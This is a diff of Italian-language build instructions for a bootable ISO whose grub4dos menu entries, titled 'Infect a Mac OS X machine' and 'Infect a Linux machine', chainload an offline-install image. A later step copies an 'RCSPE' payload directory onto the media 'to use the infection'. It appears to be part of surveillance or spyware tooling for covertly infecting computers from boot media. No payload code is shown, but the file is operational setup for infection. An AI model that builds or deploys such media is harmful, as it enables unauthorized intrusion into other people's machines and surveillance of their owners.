@@ -92,12 +92,21 @@
 
 
 		### MENU START
-		title Mac & Linux\nInfect a Mac or Linux machine
+		title Mac OS X\nInfect a Mac OS X machine
 		ls /images/offlineinstalllin.iso || find --set-root /images/offlineinstalllin.iso
 		map --heads=0 --sectors-per-track=0 /images/offlineinstalllin.iso (0xff) || map --heads=0 --sectors-per-track=0 --mem /images/offlineinstalllin.iso (0xff)
 		map --hook
 		chainloader (0xff)
 		### MENU END
+
+
+		### MENU START
+                title Linux\nInfect a Linux machine
+                ls /images/offlineinstalllin.iso || find --set-root /images/offlineinstalllin.iso
+                map --heads=0 --sectors-per-track=0 /images/offlineinstalllin.iso (0xff) || map --heads=0 --sectors-per-track=0 --mem /images/offlineinstalllin.iso (0xff)
+                map --hook
+                chainloader (0xff)
+                ### MENU END
 
 	3) Copiare l'immagine del boot:
 
@@ -107,9 +116,9 @@
 		$ chmod +x DualBootISO/Content/menuset
 		$ chmod -w DualBootISO/Content/menu.lst
 
-	4) Se si desidera provare l'infezione, copiare rcspe in:
+	4) Se si desidera usare l'infezione, copiare RCSPE in:
 
-		$ cp -Rf rcspe DualBootISO/Content/
+		$ cp -Rf RCSPE DualBootISO/Content/
 
 	5) Eliminare:
 
